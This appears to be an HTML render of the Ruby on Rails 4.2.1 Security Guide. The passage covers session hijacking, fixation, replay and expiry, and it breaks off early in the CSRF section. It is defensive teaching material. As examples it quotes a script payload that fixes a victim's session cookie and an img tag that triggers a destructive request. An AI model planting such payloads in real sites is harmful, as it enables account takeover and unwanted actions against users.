<!DOCTYPE html>

<html>
<head>
<meta charset="UTF-8">

<title>security - rails-4.2.1 Documentation</title>

<script type="text/javascript">
  var rdoc_rel_prefix = "../../";
</script>

<script src="../../js/jquery.js"></script>
<script src="../../js/darkfish.js"></script>

<link href="../../css/fonts.css" rel="stylesheet">
<link href="../../css/rdoc.css" rel="stylesheet">



<body id="top" role="document" class="file">
<nav role="navigation">
  <div id="project-navigation">
    <div id="home-section" role="region" title="Quick navigation" class="nav-section">
  <h2>
    <a href="../../index.html" rel="home">Home</a>
  </h2>

  <div id="table-of-contents-navigation">
    <a href="../../table_of_contents.html#pages">Pages</a>
    <a href="../../table_of_contents.html#classes">Classes</a>
    <a href="../../table_of_contents.html#methods">Methods</a>
  </div>
</div>

    <div id="search-section" role="search" class="project-section initially-hidden">
  <form action="#" method="get" accept-charset="utf-8">
    <div id="search-field-wrapper">
      <input id="search-field" role="combobox" aria-label="Search"
             aria-autocomplete="list" aria-controls="search-results"
             type="text" name="search" placeholder="Search" spellcheck="false"
             title="Type to search, Up and Down to navigate, Enter to load">
    </div>

    <ul id="search-results" aria-label="Search Results"
        aria-busy="false" aria-expanded="false"
        aria-atomic="false" class="initially-hidden"></ul>
  </form>
</div>

  </div>

  
<div class="nav-section">
  <h3>Table of Contents</h3>

  <ul class="link-list" role="directory">
    <li><a href="#label-Ruby+on+Rails+Security+Guide">Ruby on Rails Security Guide</a>
    <li><a href="#label-Introduction">Introduction</a>
    <li><a href="#label-Sessions">Sessions</a>
    <li><a href="#label-What+are+Sessions-3F">What are Sessions?</a>
    <li><a href="#label-Session+id">Session id</a>
    <li><a href="#label-Session+Hijacking">Session Hijacking</a>
    <li><a href="#label-Session+Guidelines">Session Guidelines</a>
    <li><a href="#label-Session+Storage">Session Storage</a>
    <li><a href="#label-Replay+Attacks+for+CookieStore+Sessions">Replay Attacks for CookieStore Sessions</a>
    <li><a href="#label-Session+Fixation">Session Fixation</a>
    <li><a href="#label-Session+Fixation+-+Countermeasures">Session Fixation - Countermeasures</a>
    <li><a href="#label-Session+Expiry">Session Expiry</a>
    <li><a href="#label-Cross-Site+Request+Forgery+-28CSRF-29">Cross-Site Request Forgery (CSRF)</a>
    <li><a href="#label-CSRF+Countermeasures">CSRF Countermeasures</a>
    <li><a href="#label-Redirection+and+Files">Redirection and Files</a>
    <li><a href="#label-Redirection">Redirection</a>
    <li><a href="#label-Self-contained+XSS">Self-contained XSS</a>
    <li><a href="#label-File+Uploads">File Uploads</a>
    <li><a href="#label-Executable+Code+in+File+Uploads">Executable Code in File Uploads</a>
    <li><a href="#label-File+Downloads">File Downloads</a>
    <li><a href="#label-Intranet+and+Admin+Security">Intranet and Admin Security</a>
    <li><a href="#label-Additional+Precautions">Additional Precautions</a>
    <li><a href="#label-User+Management">User Management</a>
    <li><a href="#label-Brute-Forcing+Accounts">Brute-Forcing Accounts</a>
    <li><a href="#label-Account+Hijacking">Account Hijacking</a>
    <li><a href="#label-Passwords">Passwords</a>
    <li><a href="#label-E-Mail">E-Mail</a>
    <li><a href="#label-Other">Other</a>
    <li><a href="#label-CAPTCHAs">CAPTCHAs</a>
    <li><a href="#label-Logging">Logging</a>
    <li><a href="#label-Good+Passwords">Good Passwords</a>
    <li><a href="#label-Regular+Expressions">Regular Expressions</a>
    <li><a href="#label-Privilege+Escalation">Privilege Escalation</a>
    <li><a href="#label-Injection">Injection</a>
    <li><a href="#label-Whitelists+versus+Blacklists">Whitelists versus Blacklists</a>
    <li><a href="#label-SQL+Injection">SQL Injection</a>
    <li><a href="#label-Introduction">Introduction</a>
    <li><a href="#label-Bypassing+Authorization">Bypassing Authorization</a>
    <li><a href="#label-Unauthorized+Reading">Unauthorized Reading</a>
    <li><a href="#label-Countermeasures">Countermeasures</a>
    <li><a href="#label-Cross-Site+Scripting+-28XSS-29">Cross-Site Scripting (XSS)</a>
    <li><a href="#label-Entry+Points">Entry Points</a>
    <li><a href="#label-HTML-2FJavaScript+Injection">HTML/JavaScript Injection</a>
    <li><a href="#label-Cookie+Theft">Cookie Theft</a>
    <li><a href="#label-Defacement">Defacement</a>
    <li><a href="#label-Countermeasures">Countermeasures</a>
    <li><a href="#label-Obfuscation+and+Encoding+Injection">Obfuscation and Encoding Injection</a>
    <li><a href="#label-Examples+from+the+Underground">Examples from the Underground</a>
    <li><a href="#label-CSS+Injection">CSS Injection</a>
    <li><a href="#label-Countermeasures">Countermeasures</a>
    <li><a href="#label-Textile+Injection">Textile Injection</a>
    <li><a href="#label-Countermeasures">Countermeasures</a>
    <li><a href="#label-Ajax+Injection">Ajax Injection</a>
    <li><a href="#label-Command+Line+Injection">Command Line Injection</a>
    <li><a href="#label-Header+Injection">Header Injection</a>
    <li><a href="#label-Response+Splitting">Response Splitting</a>
    <li><a href="#label-Unsafe+Query+Generation">Unsafe Query Generation</a>
    <li><a href="#label-Default+Headers">Default Headers</a>
    <li><a href="#label-Environmental+Security">Environmental Security</a>
    <li><a href="#label-Additional+Resources">Additional Resources</a>
  </ul>
</div>


  <div id="project-metadata">
    <div id="fileindex-section" class="nav-section">
  <h3>Pages</h3>

  <ul class="link-list">
  
    <li><a href="../../README_md.html">README</a>
  
    <li><a href="../../guides/CHANGELOG_md.html">CHANGELOG</a>
  
    <li><a href="../../guides/Rakefile.html">Rakefile</a>
  
    <li><a href="../../guides/assets/images/icons/README.html">README</a>
  
    <li><a href="../../guides/assets/javascripts/guides_js.html">guides.js</a>
  
    <li><a href="../../guides/assets/javascripts/jquery_min_js.html">jquery.min.js</a>
  
    <li><a href="../../guides/assets/javascripts/responsive-tables_js.html">responsive-tables.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushAS3_js.html">shBrushAS3.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushAppleScript_js.html">shBrushAppleScript.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushBash_js.html">shBrushBash.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushCSharp_js.html">shBrushCSharp.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushColdFusion_js.html">shBrushColdFusion.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushCpp_js.html">shBrushCpp.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushCss_js.html">shBrushCss.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushDelphi_js.html">shBrushDelphi.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushDiff_js.html">shBrushDiff.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushErlang_js.html">shBrushErlang.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushGroovy_js.html">shBrushGroovy.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushJScript_js.html">shBrushJScript.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushJava_js.html">shBrushJava.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushJavaFX_js.html">shBrushJavaFX.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushPerl_js.html">shBrushPerl.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushPhp_js.html">shBrushPhp.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushPlain_js.html">shBrushPlain.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushPowerShell_js.html">shBrushPowerShell.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushPython_js.html">shBrushPython.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushRuby_js.html">shBrushRuby.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushSass_js.html">shBrushSass.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushScala_js.html">shBrushScala.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushSql_js.html">shBrushSql.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushVb_js.html">shBrushVb.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shBrushXml_js.html">shBrushXml.js</a>
  
    <li><a href="../../guides/assets/javascripts/syntaxhighlighter/shCore_js.html">shCore.js</a>
  
    <li><a href="../../guides/assets/stylesheets/fixes_css.html">fixes.css</a>
  
    <li><a href="../../guides/assets/stylesheets/kindle_css.html">kindle.css</a>
  
    <li><a href="../../guides/assets/stylesheets/main_css.html">main.css</a>
  
    <li><a href="../../guides/assets/stylesheets/print_css.html">print.css</a>
  
    <li><a href="../../guides/assets/stylesheets/reset_css.html">reset.css</a>
  
    <li><a href="../../guides/assets/stylesheets/responsive-tables_css.html">responsive-tables.css</a>
  
    <li><a href="../../guides/assets/stylesheets/style_css.html">style.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCore_css.html">shCore.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreDefault_css.html">shCoreDefault.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreDjango_css.html">shCoreDjango.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreEclipse_css.html">shCoreEclipse.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreEmacs_css.html">shCoreEmacs.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreFadeToGrey_css.html">shCoreFadeToGrey.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreMDUltra_css.html">shCoreMDUltra.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreMidnight_css.html">shCoreMidnight.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shCoreRDark_css.html">shCoreRDark.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeDefault_css.html">shThemeDefault.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeDjango_css.html">shThemeDjango.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeEclipse_css.html">shThemeEclipse.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeEmacs_css.html">shThemeEmacs.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeFadeToGrey_css.html">shThemeFadeToGrey.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeMDUltra_css.html">shThemeMDUltra.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeMidnight_css.html">shThemeMidnight.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeRDark_css.html">shThemeRDark.css</a>
  
    <li><a href="../../guides/assets/stylesheets/syntaxhighlighter/shThemeRailsGuides_css.html">shThemeRailsGuides.css</a>
  
    <li><a href="../../guides/source/2_2_release_notes_md.html">2_2_release_notes</a>
  
    <li><a href="../../guides/source/2_3_release_notes_md.html">2_3_release_notes</a>
  
    <li><a href="../../guides/source/3_0_release_notes_md.html">3_0_release_notes</a>
  
    <li><a href="../../guides/source/3_1_release_notes_md.html">3_1_release_notes</a>
  
    <li><a href="../../guides/source/3_2_release_notes_md.html">3_2_release_notes</a>
  
    <li><a href="../../guides/source/4_0_release_notes_md.html">4_0_release_notes</a>
  
    <li><a href="../../guides/source/4_1_release_notes_md.html">4_1_release_notes</a>
  
    <li><a href="../../guides/source/4_2_release_notes_md.html">4_2_release_notes</a>
  
    <li><a href="../../guides/source/action_controller_overview_md.html">action_controller_overview</a>
  
    <li><a href="../../guides/source/action_mailer_basics_md.html">action_mailer_basics</a>
  
    <li><a href="../../guides/source/action_view_overview_md.html">action_view_overview</a>
  
    <li><a href="../../guides/source/active_job_basics_md.html">active_job_basics</a>
  
    <li><a href="../../guides/source/active_model_basics_md.html">active_model_basics</a>
  
    <li><a href="../../guides/source/active_record_basics_md.html">active_record_basics</a>
  
    <li><a href="../../guides/source/active_record_callbacks_md.html">active_record_callbacks</a>
  
    <li><a href="../../guides/source/active_record_migrations_md.html">active_record_migrations</a>
  
    <li><a href="../../guides/source/active_record_postgresql_md.html">active_record_postgresql</a>
  
    <li><a href="../../guides/source/active_record_querying_md.html">active_record_querying</a>
  
    <li><a href="../../guides/source/active_record_validations_md.html">active_record_validations</a>
  
    <li><a href="../../guides/source/active_support_core_extensions_md.html">active_support_core_extensions</a>
  
    <li><a href="../../guides/source/active_support_instrumentation_md.html">active_support_instrumentation</a>
  
    <li><a href="../../guides/source/api_documentation_guidelines_md.html">api_documentation_guidelines</a>
  
    <li><a href="../../guides/source/asset_pipeline_md.html">asset_pipeline</a>
  
    <li><a href="../../guides/source/association_basics_md.html">association_basics</a>
  
    <li><a href="../../guides/source/autoloading_and_reloading_constants_md.html">autoloading_and_reloading_constants</a>
  
    <li><a href="../../guides/source/caching_with_rails_md.html">caching_with_rails</a>
  
    <li><a href="../../guides/source/command_line_md.html">command_line</a>
  
    <li><a href="../../guides/source/configuring_md.html">configuring</a>
  
    <li><a href="../../guides/source/contributing_to_ruby_on_rails_md.html">contributing_to_ruby_on_rails</a>
  
    <li><a href="../../guides/source/debugging_rails_applications_md.html">debugging_rails_applications</a>
  
    <li><a href="../../guides/source/development_dependencies_install_md.html">development_dependencies_install</a>
  
    <li><a href="../../guides/source/documents_yaml.html">documents.yaml</a>
  
    <li><a href="../../guides/source/engines_md.html">engines</a>
  
    <li><a href="../../guides/source/form_helpers_md.html">form_helpers</a>
  
    <li><a href="../../guides/source/generators_md.html">generators</a>
  
    <li><a href="../../guides/source/getting_started_md.html">getting_started</a>
  
    <li><a href="../../guides/source/i18n_md.html">i18n</a>
  
    <li><a href="../../guides/source/initialization_md.html">initialization</a>
  
    <li><a href="../../guides/source/layouts_and_rendering_md.html">layouts_and_rendering</a>
  
    <li><a href="../../guides/source/maintenance_policy_md.html">maintenance_policy</a>
  
    <li><a href="../../guides/source/nested_model_forms_md.html">nested_model_forms</a>
  
    <li><a href="../../guides/source/plugins_md.html">plugins</a>
  
    <li><a href="../../guides/source/rails_application_templates_md.html">rails_application_templates</a>
  
    <li><a href="../../guides/source/rails_on_rack_md.html">rails_on_rack</a>
  
    <li><a href="../../guides/source/routing_md.html">routing</a>
  
    <li><a href="../../guides/source/ruby_on_rails_guides_guidelines_md.html">ruby_on_rails_guides_guidelines</a>
  
    <li><a href="../../guides/source/security_md.html">security</a>
  
    <li><a href="../../guides/source/testing_md.html">testing</a>
  
    <li><a href="../../guides/source/upgrading_ruby_on_rails_md.html">upgrading_ruby_on_rails</a>
  
    <li><a href="../../guides/source/working_with_javascript_in_rails_md.html">working_with_javascript_in_rails</a>
  
  </ul>
</div>

  </div>
</nav>

<main role="main" aria-label="Page guides/source/security.md">

<h1 id="label-Ruby+on+Rails+Security+Guide">Ruby on Rails Security Guide<span><a href="#label-Ruby+on+Rails+Security+Guide">&para;</a> <a href="#top">&uarr;</a></span></h1>

<p>This manual describes common security problems in web applications and how
to avoid them with Rails.</p>

<p>After reading this guide, you will know:</p>

<p>All countermeasures <em>that are highlighted</em>.  The concept of sessions
in Rails, what to put in there and popular attack methods.  How just
visiting a site can be a security problem (with CSRF).  What you have to
pay attention to when working with files or providing an administration
interface.  How to manage users: Logging in and out and attack methods on
all layers.  And the most popular injection attack methods.</p>
<hr>

<h2 id="label-Introduction">Introduction<span><a href="#label-Introduction">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>Web application frameworks are made to help developers build web
applications. Some of them also help you with securing the web application.
In fact one framework is not more secure than another: If you use it
correctly, you will be able to build secure apps with many frameworks. Ruby
on Rails has some clever helper methods, for example against SQL injection,
so that this is hardly a problem.</p>

<p>In general there is no such thing as plug-n-play security. Security depends
on the people using the framework, and sometimes on the development method.
And it depends on all layers of a web application environment: The back-end
storage, the web server and the web application itself (and possibly other
layers or applications).</p>

<p>The Gartner Group however estimates that 75% of attacks are at the web
application layer, and found out “that out of 300 audited sites, 97% are
vulnerable to attack”. This is because web applications are relatively easy
to attack, as they are simple to understand and manipulate, even by the lay
person.</p>

<p>The threats against web applications include user account hijacking, bypass
of access control, reading or modifying sensitive data, or presenting
fraudulent content. Or an attacker might be able to install a Trojan horse
program or unsolicited e-mail sending software, aim at financial enrichment
or cause brand name damage by modifying company resources. In order to
prevent attacks, minimize their impact and remove points of attack, first
of all, you have to fully understand the attack methods in order to find
the correct countermeasures. That is what this guide aims at.</p>

<p>In order to develop secure web applications you have to keep up to date on
all layers and know your enemies. To keep up to date subscribe to security
mailing lists, read security blogs and make updating and security checks a
habit (check the <a href="#additional-resources">Additional Resources</a>
chapter). It is done manually because that&#39;s how you find the nasty
logical security problems.</p>

<h2 id="label-Sessions">Sessions<span><a href="#label-Sessions">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>A good place to start looking at security is with sessions, which can be
vulnerable to particular attacks.</p>

<h3 id="label-What+are+Sessions-3F">What are Sessions?<span><a href="#label-What+are+Sessions-3F">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>HTTP is a stateless protocol. Sessions make it stateful.</em></p>

<p>Most applications need to keep track of certain state of a particular user.
This could be the contents of a shopping basket or the user id of the
currently logged in user. Without the idea of sessions, the user would have
to identify, and probably authenticate, on every request. Rails will create
a new session automatically if a new user accesses the application. It will
load an existing session if the user has already used the application.</p>

<p>A session usually consists of a hash of values and a session id, usually a
32-character string, to identify the hash. Every cookie sent to the
client&#39;s browser includes the session id. And the other way round: the
browser will send it to the server on every request from the client. In
Rails you can save and retrieve values using the session method:</p>

<pre class="ruby"><span class="ruby-identifier">session</span>[:<span class="ruby-identifier">user_id</span>] = <span class="ruby-ivar">@current_user</span>.<span class="ruby-identifier">id</span>
<span class="ruby-constant">User</span>.<span class="ruby-identifier">find</span>(<span class="ruby-identifier">session</span>[:<span class="ruby-identifier">user_id</span>])
</pre>

<h3 id="label-Session+id">Session id<span><a href="#label-Session+id">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>The session id is a 32 byte long MD5 hash value.</em></p>

<p>A session id consists of the hash value of a random string. The random
string is the current time, a random number between 0 and 1, the process id
number of the Ruby interpreter (also basically a random number) and a
constant string. Currently it is not feasible to brute-force Rails&#39;
session ids. To date MD5 is uncompromised, but there have been collisions,
so it is theoretically possible to create another input text with the same
hash value. But this has had no security impact to date.</p>

<h3 id="label-Session+Hijacking">Session Hijacking<span><a href="#label-Session+Hijacking">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>Stealing a user&#39;s session id lets an attacker use the web
application in the victim&#39;s name.</em></p>

<p>Many web applications have an authentication system: a user provides a user
name and password, the web application checks them and stores the
corresponding user id in the session hash. From now on, the session is
valid. On every request the application will load the user, identified by
the user id in the session, without the need for new authentication. The
session id in the cookie identifies the session.</p>

<p>Hence, the cookie serves as temporary authentication for the web
application. Anyone who seizes a cookie from someone else, may use the web
application as this user - with possibly severe consequences. Here are some
ways to hijack a session, and their countermeasures:</p>

<p>Sniff the cookie in an insecure network. A wireless LAN can be an example
of such a network. In an unencrypted wireless LAN it is especially easy to
listen to the traffic of all connected clients. For the web application
builder this means to <em>provide a secure connection over SSL</em>. In
Rails 3.1 and later, this could be accomplished by always forcing SSL
connection in your application config file:</p>

<pre>```ruby
config.force_ssl = true
```</pre>

<p>Most people don&#39;t clear out the cookies after working at a public
terminal. So if the last user didn&#39;t log out of a web application, you
would be able to use it as this user. Provide the user with a <em>log-out
button</em> in the web application, and <em>make it prominent</em>.</p>

<p>Many cross-site scripting (XSS) exploits aim at obtaining the user&#39;s
cookie. You&#39;ll read <a href="#cross-site-scripting-xss">more about
XSS</a> later.</p>

<p>Instead of stealing a cookie unknown to the attacker, they fix a user&#39;s
session identifier (in the cookie) known to them. Read more about this
so-called session fixation later.</p>

<p>The main objective of most attackers is to make money. The underground
prices for stolen bank login accounts range from $10-$1000 (depending on
the available amount of funds), $0.40-$20 for credit card numbers, $1-$8
for online auction site accounts and $4-$30 for email passwords, according
to the <a
href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec
Global Internet Security Threat Report</a>.</p>

<h3 id="label-Session+Guidelines">Session Guidelines<span><a href="#label-Session+Guidelines">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>Here are some general guidelines on sessions.</p>

<p><em>Do not store large objects in a session</em>. Instead you should store
them in the database and save their id in the session. This will eliminate
synchronization headaches and it won&#39;t fill up your session storage
space (depending on what session storage you chose, see below). This will
also be a good idea, if you modify the structure of an object and old
versions of it are still in some user&#39;s cookies. With server-side
session storages you can clear out the sessions, but with client-side
storages, this is hard to mitigate.</p>

<p><em>Critical data should not be stored in session</em>. If the user clears
their cookies or closes the browser, they will be lost. And with a
client-side session storage, the user can read the data.</p>

<h3 id="label-Session+Storage">Session Storage<span><a href="#label-Session+Storage">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Rails provides several storage mechanisms for the session hashes.
The most important is
<code>ActionDispatch::Session::CookieStore</code>.</em></p>

<p>Rails 2 introduced a new default session storage, CookieStore. CookieStore
saves the session hash directly in a cookie on the client-side. The server
retrieves the session hash from the cookie and eliminates the need for a
session id. That will greatly increase the speed of the application, but it
is a controversial storage option and you have to think about the security
implications of it:</p>

<p>Cookies imply a strict size limit of 4kB. This is fine as you should not
store large amounts of data in a session anyway, as described before.
<em>Storing the current user&#39;s database id in a session is usually
ok</em>.</p>

<p>The client can see everything you store in a session, because it is stored
in clear-text (actually Base64-encoded, so not encrypted). So, of course,
<em>you don&#39;t want to store any secrets here</em>. To prevent session
hash tampering, a digest is calculated from the session with a server-side
secret and inserted into the end of the cookie.</p>

<p>That means the security of this storage depends on this secret (and on the
digest algorithm, which defaults to SHA1, for compatibility). So
<em>don&#39;t use a trivial secret, i.e. a word from a dictionary, or one
which is shorter than 30 characters</em>.</p>

<p><code>secrets.secret_key_base</code> is used for specifying a key which
allows sessions for the application to be verified against a known secure
key to prevent tampering. Applications get
<code>secrets.secret_key_base</code> initialized to a random key present in
<code>config/secrets.yml</code>, e.g.:</p>

<pre>development:
  secret_key_base: a75d...

test:
  secret_key_base: 492f...

production:
  secret_key_base: &lt;%= ENV[&quot;SECRET_KEY_BASE&quot;] %&gt;</pre>

<p>Older versions of Rails use CookieStore, which uses
<code>secret_token</code> instead of <code>secret_key_base</code> that is
used by EncryptedCookieStore. Read the upgrade documentation for more
information.</p>

<p>If you have received an application where the secret was exposed (e.g. an
application whose source was shared), strongly consider changing the
secret.</p>

<h3 id="label-Replay+Attacks+for+CookieStore+Sessions">Replay Attacks for CookieStore Sessions<span><a href="#label-Replay+Attacks+for+CookieStore+Sessions">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>TIP: <em>Another sort of attack you have to be aware of when using
<code>CookieStore</code> is the replay attack.</em></p>

<p>It works like this:</p>

<p>A user receives credits, the amount is stored in a session (which is a bad
idea anyway, but we&#39;ll do this for demonstration purposes).  The user
buys something.  The new adjusted credit value is stored in the session. 
The user takes the cookie from the first step (which they previously
copied) and replaces the current cookie in the browser.  The user has their
original credit back.</p>

<p>Including a nonce (a random value) in the session solves replay attacks. A
nonce is valid only once, and the server has to keep track of all the valid
nonces. It gets even more complicated if you have several application
servers (mongrels). Storing nonces in a database table would defeat the
entire purpose of CookieStore (avoiding accessing the database).</p>

<p>The best <em>solution against it is not to store this kind of data in a
session, but in the database</em>. In this case store the credit in the
database and the logged_in_user_id in the session.</p>

<h3 id="label-Session+Fixation">Session Fixation<span><a href="#label-Session+Fixation">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Apart from stealing a user&#39;s session id, the attacker may fix
a session id known to them. This is called session fixation.</em></p>

<p><img src="images/session_fixation.png"></p>

<p>This attack focuses on fixing a user&#39;s session id known to the
attacker, and forcing the user&#39;s browser into using this id. It is
therefore not necessary for the attacker to steal the session id
afterwards. Here is how this attack works:</p>

<p>The attacker creates a valid session id: They load the login page of the
web application where they want to fix the session, and take the session id
in the cookie from the response (see number 1 and 2 in the image).  They
maintain the session by accessing the web application periodically in order
to keep an expiring session alive.  The attacker forces the user&#39;s
browser into using this session id (see number 3 in the image). As you may
not change a cookie of another domain (because of the same origin policy),
the attacker has to run a JavaScript from the domain of the target web
application. Injecting the JavaScript code into the application by XSS
accomplishes this attack. Here is an example:
<code>&lt;script&gt;document.cookie=&quot;_session_id=16d5b78abb28e3d6206b60f22a03c8d9&quot;;&lt;/script&gt;</code>.
Read more about XSS and injection later on.  The attacker lures the victim
to the infected page with the JavaScript code. By viewing the page, the
victim&#39;s browser will change the session id to the trap session id.  As
the new trap session is unused, the web application will require the user
to authenticate.  From now on, the victim and the attacker will co-use the
web application with the same session: The session became valid and the
victim didn&#39;t notice the attack.</p>

<h3 id="label-Session+Fixation+-+Countermeasures">Session Fixation - Countermeasures<span><a href="#label-Session+Fixation+-+Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>TIP: <em>One line of code will protect you from session fixation.</em></p>

<p>The most effective countermeasure is to <em>issue a new session
identifier</em> and declare the old one invalid after a successful login.
That way, an attacker cannot use the fixed session identifier. This is a
good countermeasure against session hijacking, as well. Here is how to
create a new session in Rails:</p>

<pre class="ruby"><span class="ruby-identifier">reset_session</span>
</pre>

<p>If you use the popular RestfulAuthentication plugin for user management,
add reset_session to the SessionsController#create action. Note that this
removes any value from the session, <em>you have to transfer them to the
new session</em>.</p>

<p>Another countermeasure is to <em>save user-specific properties in the
session</em>, verify them every time a request comes in, and deny access,
if the information does not match. Such properties could be the remote IP
address or the user agent (the web browser name), though the latter is less
user-specific. When saving the IP address, you have to bear in mind that
there are Internet service providers or large organizations that put their
users behind proxies. <em>These might change over the course of a
session</em>, so these users will not be able to use your application, or
only in a limited way.</p>

<h3 id="label-Session+Expiry">Session Expiry<span><a href="#label-Session+Expiry">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Sessions that never expire extend the time-frame for attacks such
as cross-site request forgery (CSRF), session hijacking and session
fixation.</em></p>

<p>One possibility is to set the expiry time-stamp of the cookie with the
session id. However the client can edit cookies that are stored in the web
browser so expiring sessions on the server is safer. Here is an example of
how to <em>expire sessions in a database table</em>. Call
<code>Session.sweep(&quot;20 minutes&quot;)</code> to expire sessions that
were used longer than 20 minutes ago.</p>

<pre class="ruby"><span class="ruby-keyword">class</span> <span class="ruby-constant">Session</span> <span class="ruby-operator">&lt;</span> <span class="ruby-constant">ActiveRecord</span><span class="ruby-operator">::</span><span class="ruby-constant">Base</span>
  <span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier">sweep</span>(<span class="ruby-identifier">time</span> = <span class="ruby-value">1</span>.<span class="ruby-identifier">hour</span>)
    <span class="ruby-keyword">if</span> <span class="ruby-identifier">time</span>.<span class="ruby-identifier">is_a?</span>(<span class="ruby-constant">String</span>)
      <span class="ruby-identifier">time</span> = <span class="ruby-identifier">time</span>.<span class="ruby-identifier">split</span>.<span class="ruby-identifier">inject</span> { <span class="ruby-operator">|</span><span class="ruby-identifier">count</span>, <span class="ruby-identifier">unit</span><span class="ruby-operator">|</span> <span class="ruby-identifier">count</span>.<span class="ruby-identifier">to_i</span>.<span class="ruby-identifier">send</span>(<span class="ruby-identifier">unit</span>) }
    <span class="ruby-keyword">end</span>

    <span class="ruby-identifier">delete_all</span> <span class="ruby-node">&quot;updated_at &lt; &#39;#{time.ago.to_s(:db)}&#39;&quot;</span>
  <span class="ruby-keyword">end</span>
<span class="ruby-keyword">end</span>
</pre>

<p>The section about session fixation introduced the problem of maintained
sessions. An attacker maintaining a session every five minutes can keep the
session alive forever, although you are expiring sessions. A simple
solution for this would be to add a created_at column to the sessions
table. Now you can delete sessions that were created a long time ago. Use
this line in the sweep method above:</p>

<pre class="ruby"><span class="ruby-identifier">delete_all</span> <span class="ruby-node">&quot;updated_at &lt; &#39;#{time.ago.to_s(:db)}&#39; OR
  created_at &lt; &#39;#{2.days.ago.to_s(:db)}&#39;&quot;</span>
</pre>

<h2 id="label-Cross-Site+Request+Forgery+-28CSRF-29">Cross-Site Request Forgery (CSRF)<span><a href="#label-Cross-Site+Request+Forgery+-28CSRF-29">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>This attack method works by including malicious code or a link in a page
that accesses a web application that the user is believed to have
authenticated. If the session for that web application has not timed out,
an attacker may execute unauthorized commands.</p>

<p><img src="images/csrf.png"></p>

<p>In the <a href="#sessions">session chapter</a> you have learned that most
Rails applications use cookie-based sessions. Either they store the session
id in the cookie and have a server-side session hash, or the entire session
hash is on the client-side. In either case the browser will automatically
send along the cookie on every request to a domain, if it can find a cookie
for that domain. The controversial point is, that it will also send the
cookie, if the request comes from a site of a different domain. Let&#39;s
start with an example:</p>

<p>Bob browses a message board and views a post from a hacker where there is a
crafted HTML image element. The element references a command in Bob&#39;s
project management application, rather than an image file.  <code>&lt;img
src=&quot;http://www.webapp.com/project/1/destroy&quot;&gt;</code> 
Bob&#39;s session at <a href="www.webapp.com">www.webapp.com</a> is still
alive, because he didn&#39;t log out a few minutes ago.  By viewing the
post, the browser finds an image tag. It tries to load the suspected image
from <a href="www.webapp.com.">www.webapp.com.</a> As explained before, it
will also send along the cookie with the valid session id.  The web
